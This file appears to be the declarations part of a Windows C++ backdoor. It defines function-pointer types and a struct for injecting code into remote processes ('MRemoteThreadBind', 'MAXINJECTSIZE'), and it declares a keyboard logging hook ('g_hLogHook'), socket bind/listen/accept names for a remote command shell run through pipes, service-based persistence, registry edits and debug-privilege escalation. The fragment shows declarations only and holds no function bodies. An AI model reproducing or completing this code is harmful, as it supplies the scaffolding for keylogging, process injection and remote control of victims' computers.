#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <winsock.h>
#include <WINUSER.H>
VOID WINAPI ServiceMain( DWORD dwArgc, LPTSTR *lpszArgv );

VOID WINAPI Handler( DWORD fdwControl ) ;

void HookTh();

LRESULT CALLBACK WndProc (HWND, UINT, WPARAM, LPARAM) ;

typedef unsigned long NTSTATUS;

typedef int (__stdcall *MWSAStartup) ( WORD ,LPWSADATA ); 

typedef HINSTANCE (__stdcall *PLoadLibraryW)(char*);

typedef FARPROC (__stdcall *PGetProcAddress)(HMODULE, LPCSTR);

typedef HINSTANCE (__stdcall *PFreeLibFunc)( HINSTANCE );

typedef HINSTANCE (__stdcall *PGetModuleHandle)(HMODULE);

typedef LRESULT (__stdcall *PCallNextHookEx)(HHOOK,int,WPARAM, LPARAM);

typedef LRESULT (__stdcall *PDefWindowProc)(HWND ,UINT ,WPARAM, LPARAM);

typedef HANDLE (__stdcall *PCreateFile)(LPCTSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);

typedef LONG (__stdcall *PRegOpenKeyEx)(HKEY,LPCTSTR,DWORD,REGSAM,PHKEY);

typedef LONG (__stdcall *PRegCreateKey)( HKEY,LPCTSTR,PHKEY);

typedef BOOL (__stdcall *PWriteFile)( HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);

typedef LONG (__stdcall *PRegSetValueEx)( HKEY,LPCTSTR,DWORD,DWORD,CONST BYTE *lpData,DWORD);

typedef LONG (__stdcall *PRegCloseKey)( HKEY);

typedef LONG (__stdcall *PRegDeleteValue)( HKEY,LPCTSTR);

typedef BOOL (__stdcall *PCloseHandle)( HANDLE);

typedef BOOL (__stdcall *PDeleteFile)( LPCTSTR);

typedef void (__stdcall *Pmalloc)( size_t);

typedef int (__stdcall *PMessageBox)( HWND,LPCTSTR,LPCTSTR,UINT);

typedef BOOL (__stdcall *PUnhookWindowsHookEx)( HHOOK);

typedef DWORD (__stdcall *PGetFileSize)(HANDLE,LPDWORD);

typedef VOID (__stdcall *PSleep)(DWORD);

typedef LONG  (__stdcall *PSetWindowLong)(HWND,int,LONG);

typedef HWND  (__stdcall *PCreateWindow)(DWORD,LPCTSTR,LPCTSTR,DWORD,int,int,int,int,

										 HWND,HMENU,HANDLE,LPVOID);
typedef BOOL  (__stdcall *PGetMessage)(LPMSG,HWND,UINT,UINT); 

typedef LONG  (__stdcall *PDispatchMessage)(struct tagMSG *);

typedef HHOOK   (__stdcall *PSetWindowsHookEx)(int,HOOKPROC,HINSTANCE,DWORD);

typedef int (__stdcall *PMessageBeep)(UINT );

typedef BOOL  (__stdcall *PSetConsoleCtrlHandler)(PHANDLER_ROUTINE,BOOL); 

typedef BOOL (__stdcall *PCreateProcess)( LPCTSTR,LPTSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES, 
											BOOL,DWORD,LPVOID,LPCTSTR,LPSTARTUPINFO,LPPROCESS_INFORMATION); 

typedef bool (__stdcall *PPeekNamedPipe)(HANDLE, LPVOID,DWORD ,LPDWORD ,LPDWORD , LPDWORD );

typedef bool (__stdcall *PCreatePipe)(PHANDLE,PHANDLE,LPSECURITY_ATTRIBUTES ,DWORD );

typedef bool (__stdcall *PTerminateProcess)(HANDLE ,UINT );

typedef HWND (__stdcall *PGetTopWindow)(HWND);

typedef SC_HANDLE (__stdcall *POpenSCManager)(LPCTSTR,LPCTSTR,DWORD);

typedef SC_HANDLE (__stdcall *PCreateService)(SC_HANDLE, 
 LPCTSTR,LPCTSTR,DWORD,DWORD,DWORD,DWORD,LPCTSTR,LPCTSTR,LPDWORD,LPCTSTR,LPCTSTR,LPCTSTR);

typedef SC_HANDLE (__stdcall *PCloseServiceHandle)(SC_HANDLE);

typedef SC_HANDLE (__stdcall *POpenService)(SC_HANDLE,LPCTSTR,DWORD);

typedef BOOL (__stdcall *PDeleteService)(SC_HANDLE);

typedef HANDLE (__stdcall *PCreateThread)(LPSECURITY_ATTRIBUTES,DWORD,LPTHREAD_START_ROUTINE, 
											LPVOID,DWORD,LPDWORD); 
 

typedef BOOL (__stdcall *PTerminateThread)( HANDLE,DWORD); 
 

typedef BOOL (__stdcall *PPeekMessage)( LPMSG,HWND,UINT,UINT,UINT); 
 

struct RT
{
	PPeekMessage			fnPeekMessage;
	PTerminateThread		fnTerminateThread;
	PCreateThread			fnCreateThread;
	PDeleteService			fnDeleteService;
	POpenService			fnOpenService;
	PCloseServiceHandle		fnCloseServiceHandle;
	PCreateService			fnCreateService;
	POpenSCManager			fnOpenSCManager;
	PGetTopWindow			fnGetTopWindow;
	PTerminateProcess		fnTerminateProcess;
	PCreatePipe				fnCreatePipe;
	PPeekNamedPipe			fnPeekNamedPipe;
	PCreateProcess			fnCreateProcess;
	DWORD					N_addr;
	int						N_logon;
	PSetConsoleCtrlHandler	fnSetConsoleCtrlHandler;
	PMessageBeep			fnMessageBeep;
	PSetWindowsHookEx		fnSetWindowsHookEx;
	PDispatchMessage		fnDispatchMessage;
	PGetMessage				fnGetMessage;
	PSetWindowLong			fnSetWindowLong;
	PCreateWindow			fnCreateWindow;
	PSleep					fnSleep;
	PGetFileSize			fnGetFileSize;
	PUnhookWindowsHookEx	fnUnhookWindowsHookEx;
	PMessageBox				fnMessageBox;
	Pmalloc					fnmalloc;
	PDeleteFile				fnDeleteFile;
	PCloseHandle			fnCloseHandle;
	PRegDeleteValue			fnRegDeleteValue;
	PRegCloseKey			fnRegCloseKey;
	PWriteFile				fnWriteFile,fnReadFile;
	PRegSetValueEx			fnRegSetValueEx;
	PRegCreateKey			fnRegCreateKey;
	PRegOpenKeyEx			fnRegOpenKeyEx;
	PCreateFile				fnCreateFile;
	PLoadLibraryW			fnLoadLibrary;
	PGetProcAddress			fnGetProcAddress;
	PFreeLibFunc			fnFreeLibrary;
	PGetModuleHandle		fnGetModuleHandle;
	PCallNextHookEx			fnCallNextHookEx;
	PDefWindowProc			fnDefWindowProc;
 	
	char					Buff[4096];
	char					cmdLine[10];
	char					Kname[20];
	char					Mname[20];
	char					Uname[20];
	char					Sname[20];
	char					MWSAStart[20];
	int						namelen;

	char					sockM[20];
	char					bindM[20];
	char					htonsM[20];
	char					listenM[20];
	char					acceptM[20];
	char					closesocketM[30];
	char					sendM[20],recvM[20];
	char					memcmpM[20];
	
	char					Mchar[20];
	HHOOK					g_hLogHook;
	DWORD					b_addr;
	char					G_comlin[60];
	char					re_path[60];
	char					*buffer;
	char					m_mlloc[20];
	DWORD					dwLen,G_comlen,FileAddr;
	HANDLE					HandTh;
	DWORD						ServeStart;
};
HANDLE c_file;

HANDLE h_file,f_Map;

LPVOID f_Maddr;

char Tfile[20]="temp";

RT MCopy;

char *buffer;

int Ilogon;

void Temp();

const DWORD MAXINJECTSIZE = 40960;

BOOL rw_reg(int,RT *);

void EnableDebugPriv( void );

bool Bugger( HANDLE h);

DWORD __stdcall MRemoteThreadBind( RT* b );

DWORD MRemoteThreadHook( RT* b );

DWORD MRemoteThreadShut( RT* b );

typedef struct 
{
    USHORT Length;
 	USHORT MaxLen;
	USHORT *Buffer;
} UNICODE_STRING;


typedef NTSTATUS (__stdcall *NtQSI_t)( ULONG, PVOID, ULONG, PULONG );

typedef LONG (__stdcall *RtlCUS_t)( UNICODE_STRING*, UNICODE_STRING*, ULONG );

NTSTATUS (__stdcall *NtQuerySystemInformation)( IN ULONG SysInfoClass, IN OUT PVOID SystemInformation,
                                               IN ULONG SystemInformationLength, OUT PULONG RetLen );

LONG (__stdcall *RtlCompareUnicodeString)( IN UNICODE_STRING*, IN UNICODE_STRING*, IN ULONG CaseInsensitve );

BOOL CtrlHandler(DWORD fdwCtrlType);

struct process_info 
{
    ULONG NextEntryDelta;
    ULONG ThreadCount;
    ULONG Reserved1[6];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ProcessName;
    ULONG BasePriority;
    ULONG ProcessId;
 };
#pragma comment( lib, "advapi32.lib" )